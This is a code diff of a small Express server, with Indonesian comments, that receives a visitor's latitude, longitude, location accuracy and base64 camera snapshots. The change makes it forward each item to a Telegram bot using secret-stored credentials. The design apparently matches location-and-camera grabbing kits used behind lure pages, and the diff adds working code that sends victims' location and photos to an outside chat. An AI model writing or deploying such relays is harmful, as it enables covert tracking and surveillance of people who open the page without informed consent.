@@ -1,28 +1,76 @@
 const express = require("express");
-const app = express();
 
+const app = express();
 app.use(express.json({ limit: "20mb" }));
 app.use(express.static("public"));
 
-// 📍 terima lokasi
-app.post("/location", (req, res) => {
-  const { lat, lon, acc } = req.body;
-  console.log("LOCATION:", lat, lon, acc);
+// 🔐 Ambil dari environment (Secrets Replit)
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-  // 👉 di sini kamu bisa teruskan ke layanan lain (mis. Telegram)
-  res.json({ ok: true });
+// Debug cek token
+if (!BOT_TOKEN || !CHAT_ID) {
+  console.log("❌ BOT_TOKEN / CHAT_ID belum di-set di Secrets");
+}
+
+// 📍 LOCATION → kirim ke Telegram
+app.post("/location", async (req, res) => {
+  try {
+    const { lat, lon, acc } = req.body;
+
+    const text = `📍 Lokasi:
+Lat: ${lat}
+Lon: ${lon}
+Akurasi: ${acc}`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      })
+    });
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.log("Error location:", err);
+    res.status(500).send("Error");
+  }
 });
 
-// 📷 terima gambar
-app.post("/camsnap", (req, res) => {
-  const { image } = req.body;
-  console.log("IMAGE received (base64 length):", image?.length);
+// 📷 CAMERA → kirim ke Telegram
+app.post("/camsnap", async (req, res) => {
+  try {
+    const { image } = req.body;
 
-  // 👉 di sini kamu bisa simpan / forward ke layanan lain
-  res.json({ ok: true });
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: image
+      })
+    });
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.log("Error cam:", err);
+    res.status(500).send("Error");
+  }
 });
 
-app.get("/health", (req, res) => res.send("OK"));
+app.get("/", (req, res) => {
+  res.send("Server aktif");
+});
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Server running on", PORT));
+app.listen(PORT, () => {
+  console.log("🚀 Server running on port", PORT);
+});
